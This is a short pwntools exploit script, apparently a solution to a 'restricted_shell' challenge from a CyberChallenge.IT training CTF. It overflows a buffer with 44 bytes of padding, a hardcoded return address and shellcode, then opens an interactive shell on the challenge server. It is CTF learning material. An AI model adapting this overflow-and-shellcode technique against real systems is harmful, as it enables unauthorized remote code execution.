from pwn import *

exe = ELF('/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 07/restricted_shell/restricted_shell')
context.binary = exe
HOST = "rshell.challs.cyberchallenge.it"
PORT = 6003
p = remote(HOST, PORT)

print("[+] Exploiting...")
shell_code = asm(shellcraft.sh())  # Crafting shellcode
p.sendlineafter(b'c:\ >', b'a' * 44 + p32(0x8048593) + shell_code)  # address of the start of the stack plus shellcode
p.recvuntil('install')
p.recvuntil('\n\n')
p.interactive()
